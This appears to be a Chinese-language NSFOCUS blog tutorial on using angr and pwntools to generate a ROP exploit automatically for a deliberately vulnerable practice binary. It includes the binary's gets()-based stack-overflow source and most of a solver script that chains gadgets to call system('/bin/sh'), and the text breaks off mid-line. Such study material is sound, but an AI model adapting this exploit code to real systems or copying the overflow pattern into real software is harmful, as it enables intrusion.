---
title: Angr符号执行练习–Automatic Rop Chain Generation
url: https://blog.nsfocus.net/angr-2/
source: 绿盟科技技术博客
date: 2025-04-11
fetch_date: 2025-10-06T22:05:13.661671
---

# Angr符号执行练习–Automatic Rop Chain Generation

* [登录](http://blog.nsfocus.net/wp-login.php)
* [注册](http://blog.nsfocus.net/wp-login.php?action=register)

[![Logo](http://blog.nsfocus.net/wp-content/uploads/2020/07/blog-logo.png)](https://blog.nsfocus.net/)

* [技术产品](https://blog.nsfocus.net/category/technology-product/)
* [数智安全](https://blog.nsfocus.net/category/digital-intelligence-secuirty/)
* [威胁通告](https://blog.nsfocus.net/category/threat-alert/)
* [研究调研](https://blog.nsfocus.net/category/security-research/)
* [洞见RSA](https://blog.nsfocus.net/category/rsac/)
* [公益译文](https://blog.nsfocus.net/category/translation/)
* [安全分享](https://blog.nsfocus.net/category/security-sharing/)

[![Logo](http://blog.nsfocus.net/wp-content/uploads/2020/07/blog-logo.png)](https://blog.nsfocus.net/)

* [技术产品](https://blog.nsfocus.net/category/technology-product/)
* [数智安全](https://blog.nsfocus.net/category/digital-intelligence-secuirty/)
* [威胁通告](https://blog.nsfocus.net/category/threat-alert/)
* [研究调研](https://blog.nsfocus.net/category/security-research/)
* [洞见RSA](https://blog.nsfocus.net/category/rsac/)
* [公益译文](https://blog.nsfocus.net/category/translation/)
* [安全分享](https://blog.nsfocus.net/category/security-sharing/)

# Angr符号执行练习–Automatic Rop Chain Generation

### Angr符号执行练习–Automatic Rop Chain Generation

[2025-04-10](https://blog.nsfocus.net/angr-2/ "Angr符号执行练习–Automatic Rop Chain Generation")[NSFOCUS](https://blog.nsfocus.net/author/zhengfangying/ "View all posts by NSFOCUS")

阅读： 1,887

目录:

☆ 目标ELF
☆ buffer\_overflow\_64bit\_solver.py
☆ ROP工具
☆ buffer\_overflow\_64bit\_solver\_a.py
☆ 为什么buffer\_overflow\_64bit\_bad不能用于演示

————————————————————————–

☆ 目标ELF

参看

————————————————————————–
Automatic Rop Chain Generation – [2022-01-16]
https://breaking-bits.gitbook.io/breaking-bits/vulnerability-discovery/automatic-exploit-generation/automatic-rop-chain-generation

https://github.com/ChrisTheCoolHut/Auto\_rop\_chain\_generation
https://github.com/ChrisTheCoolHut/Auto\_rop\_chain\_generation/blob/master/buffer\_overflow.c
https://github.com/ChrisTheCoolHut/Auto\_rop\_chain\_generation/blob/master/buffer\_overflow\_64bit
https://github.com/ChrisTheCoolHut/Auto\_rop\_chain\_generation/blob/master/auto\_rop\_chain.py
————————————————————————–

此题作者已提供求解程序，本文只是学习所涉及的技术，无原创内容。

buffer\_overflow.c是目标源码，buffer\_overflow\_64bit是预编译的目标ELF。

————————————————————————–
int pwn\_me()
{
char my\_buf[20] = {‘\x00’};
printf(“Your buffer is at %p\n”, my\_buf);
/\*
\* 栈溢出
\*/
gets(my\_buf);
return 0;
}

void does\_nothing()
{
puts(“/bin/sh”);
execve(NULL,NULL,NULL);
system(“sleep 1”);
}

void main()
{
puts(“pwn\_me:”);
pwn\_me();
}
————————————————————————–

$ file -b buffer\_overflow\_64bit
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), …, not stripped

$ rabin2 -I buffer\_overflow\_64bit
canary false // 无”stack canary”
injprot false // 据此推断无ASLR
linenum true // 包含行号信息
lsyms true // 包含调试符号
nx true // 启用NX位保护，栈区不可执行
relocs true // 包含重定位信息
relro partial // 指Relocation Read-Only部分启用
sanitize false // 编译时未使用AddressSanitizer之类技术
static false // 动态链接
stripped false // 未strip
(输出有删减)

本次练习目的是，用angr加pwn自动生成基于ROP的Exploit。

gets()触发栈溢出，栈区不可执行，必须用ROP技术。

does\_nothing()是刻意提供给做题者的，贴心地提供了ROP所需的一切元素，可用的
关键函数、关键字符串。若从源码编译生成目标ELF，不要启用优化，否则未用代码
可能被丢弃。即便如此，仍不建议从源码生成ELF，原因后面再说。

☆ buffer\_overflow\_64bit\_solver.py

————————————————————————–
import sys, os, time, base64, logging
import angr, claripy
import pwn

def generate\_standard\_rop\_chain ( binary ) :

logging.getLogger( ‘pwnlib.elf.elf’ ).setLevel( logging.ERROR )
logging.getLogger( ‘pwnlib.rop.rop’ ).setLevel( logging.ERROR )

pwn.context.clear()
pwn.context.arch \
= ‘amd64’
pwn.context.os = ‘linux’
pwn.context.binary \
= binary
elf = pwn.ELF( binary )
rop = pwn.ROP( elf )

strings = [ b”/bin/sh\0″, b”/bin/bash\0″ ]
functions = [ “system”, “execve” ]
ret\_func = None
ret\_string = None
for function in functions :
if function in elf.plt :
ret\_func = elf.plt[function]
break
elif function in elf.symbols :
ret\_func = elf.symbols[function]
break
if not ret\_func :
raise RuntimeError( “Cannot find symbol to return to” )

for string in strings :
#
# elf.search() returns an iterator
#
str\_occurences = list( elf.search( string ) )
if str\_occurences :
ret\_string = str\_occurences[0]
break
if not ret\_string :
raise RuntimeError( “Cannot find string to pass to system or exec” )

#
# On 64-bit Linux (amd64), the system function (often implemented in
# libc) might use movaps instructions which require the stack pointer
# (rsp) to be 16-byte aligned. Sometimes, the state of the stack just
# before calling system via ROP leaves it misaligned (e.g., aligned to
# 8 bytes but not 16). Adding a single ret gadget advances the stack
# pointer by one word (8 bytes on amd64), potentially fixing this
# alignment issue.
#
# 是否增加这个ret，以实测为准，这不是包打天下的Fix
#
rop.raw( rop.ret.address )
#
# 通常会在栈上生成类似[pop\_rdi\_ret][ret\_string][ret\_func]的序列
#
rop.call( ret\_func, [ret\_string] )
#
# 0x0000: 0x40101a ret
# 0x0008: 0x4012d3 pop rdi; ret
# 0x0010: 0x40201a [arg0] rdi = 4202522 // 4202522=0x40201a
# 0x0018: 0x401094
#
try :
print( rop.dump() )
except Exception as e :
print( f”Couldn’t automatically find a way: {e}”, file=sys.stderr )
sys.exit( -1 )
return rop, rop.build()

#
# 此函数并非通用实现，只适用于”pop|ret”情形
#
def do\_64bit\_rop\_with\_stepping ( elf, rop, rop\_chain, state ) :
#
# rop\_chain是代码地址、数据地址或整数构成的list
#
# rop.gadgets是所有的gadget，是个字典，key是代码地址
#
# print( rop\_chain )
# print( rop.gadgets )

curr\_rop = None
elf\_symbol\_addrs \
= [y for x, y in elf.symbols.items()]

for i, gadget in enumerate( rop\_chain ) :
#
# We generally have two constraining mode
#
# 1. running a code gadget
# 2. setting a register to an expected popped value
#

#
# gadget有可能不是代码地址，而是数据地址或整数
#
if gadget in rop.gadgets :
curr\_rop = rop.gadgets[gadget]
#
# reversing it lets us pop values out easy
#
# list用pop()时，从尾部弹，用pop(0)时，从首部弹，但pop(0)性能
# 不好，对大list尤其如此，不建议用pop(0)，所以此处先reverse()
#
curr\_rop.regs.reverse()
#
# Case 1: running a code gadget
#
# We keep track of the number of registers our gadget popped, and
# if it’s 0, then we’re just executing
#
if curr\_rop is None or gadget in rop.gadgets or len( curr\_rop.regs ) == 0 :
desire = state.regs.pc == gadget
if state.satisfiable( extra\_constraints=( desire, ) ) :
#
# This process is slower than just setting the whole stack
# to the chain, but in testing it seems to work more
# reliably
#
print( “Setting PC to {}”.format( hex( gadget ) ) )
state.add\_constraints( desire )

#
# Since we’re emulating the program’s execution with angr
# we will run into an issue when executing any symbols.
# Where a SimProcedure will get executed instead of the
# real function, which then gives us the wrong constraints
# /execution for our rop\_chain
#
if gadget in elf\_symbol\_addrs :
item = [x for x in elf.symbols.items() if gadget == x[1]][0]
state.regs.pc = state.project.loader.find\_symbol( item[0] ).rebased\_addr
print( f”Gadget ‘{item[0]}’ is hooked symbol, contraining to real address, but calling SimProc” )

if i == len( rop\_chain ) – 1 :
break

sm = state.project.factory.simulation\_manager( state )
#
# opt\_level=0 这是关键。它告诉angr的VEX引擎禁用或减少优化。
# 默认情况下，angr会尝试一次性分析和提升(lift)一个基本块
# (basic block)的VEX IR。对于ROP gadget这种通常很短、以ret
# 结尾的代码片段，默认优化可能会导致模拟行为与实际CPU执行
# 不完全一致，或者一次模拟了过多指令。opt\_level=0 强制angr
# 更接近单步执行，更精确地模拟ROP gadget的效果。
#
sm.explore( opt\_level=0 )
if sm.unconstrained :
state = sm.unconstrained[0]
else :
print( “sm.unconstrained[] is empty”, file=sys.stderr )
sys.exit( -1 )
else :
print( “Unsatisfied setting PC to {}”.format( hex( gadget ) ), file=sys.stderr )
sys.exit( -1 )
#
# Case 2: setting a register to an expected popped value
#
else :
#
# pop()从尾部弹，由于事先reverse()过，所以此刻的pop()相当于取
# 代码中正序第一个寄存器
#
next\_reg = curr\_rop.regs.pop()
if type( next\_reg ) is not str :
print( “type( next\_reg ) is not str”, file=sys.stderr )
sys.exit( -1 )
print( “Setting register {}”.format( next\_reg ) )

gadget\_msg = gadget
if isinstance( gadget, int ) :
gadget\_msg = hex( gadget )

state\_reg = getattr( ...